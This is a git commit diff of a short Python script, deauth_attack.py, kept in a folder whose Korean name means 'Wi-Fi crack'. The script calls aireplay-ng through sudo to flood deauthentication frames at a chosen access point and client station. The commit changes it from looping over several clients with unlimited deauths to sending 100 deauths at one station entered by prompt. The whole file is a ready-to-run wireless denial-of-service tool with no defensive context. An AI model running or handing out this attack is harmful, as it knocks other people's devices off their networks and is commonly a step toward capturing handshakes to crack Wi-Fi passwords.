6b768cf83016fa87b6351bba0f5509c315b05bba
Garmin055 <gemyeong1013@gmail.com>
2024-07-28 22:02:25 +0900

    dsad

--- 와이파이 크랙/deauth_attack.py
+++ 와이파이 크랙/deauth_attack.py
@@ -1,18 +1,21 @@
 import sys
 import subprocess
 
-def run_deauth_attack(bssid, interface, clients):
-    for client in clients:
-        aireplay_cmd = ["sudo", "aireplay-ng", "-0", "0", "-a", bssid, "-c", client, interface]
-        subprocess.run(aireplay_cmd)
+def run_deauth_attack(bssid, interface, station):
+    # for client in clients:
+    aireplay_cmd = ["sudo", "aireplay-ng", "--deauth", "100", "-a", bssid, "-c", station, interface]
+    subprocess.run(aireplay_cmd)
 
 if __name__ == "__main__":
     if len(sys.argv) < 3:
         print("Usage: python3 deauth_attack.py <BSSID> <INTERFACE> <CLIENT1> [<CLIENT2> ...]")
         sys.exit(1)
 
-    bssid = sys.argv[1]
-    interface = sys.argv[2]
-    clients = sys.argv[3:]
+    # bssid = sys.argv[1]
+    # interface = sys.argv[2]
+    # clients = sys.argv[3:]
+    bssid = input("bssid: ")
+    station = input("station: ")
+    interface = input("interface: ")
 
-    run_deauth_attack(bssid, interface, clients)
+    run_deauth_attack(bssid, interface, station)
